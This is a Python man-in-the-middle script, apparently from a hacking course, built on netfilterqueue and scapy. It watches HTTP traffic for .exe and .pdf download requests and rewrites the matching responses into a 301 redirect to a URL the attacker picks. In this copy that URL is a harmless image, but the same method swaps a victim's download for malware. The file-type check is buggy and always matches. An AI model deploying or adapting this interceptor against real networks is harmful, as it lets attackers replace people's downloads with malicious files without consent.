import netfilterqueue
import scapy.all as scapy

ack_list = []
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
def process_packet(packet):

    # modifying packet
    scapy_packet = scapy.IP(packet.get_payload())
    # Checks for RAW Layer
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print(" HTTP REQUEST")
            if ".exe" or ".pdf" in scapy_packet[scapy.Raw].load:
                print("[+] Needed File Request For Download")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                # print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            print(" HTTP RESPONSE")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing File....")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://africanamphibians.myspecies.info/sites/africanamphibians.myspecies.info/files/styles/square_thumbnail/public/IMG_6514_MCZ_23113.JPG?itok=vdrvak_q\n\n")

                # print(scapy_packet.show())
                packet.set_payload(str(scapy_packet))
    # http: // africanamphibians.myspecies.info / file - colorboxed / 7

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
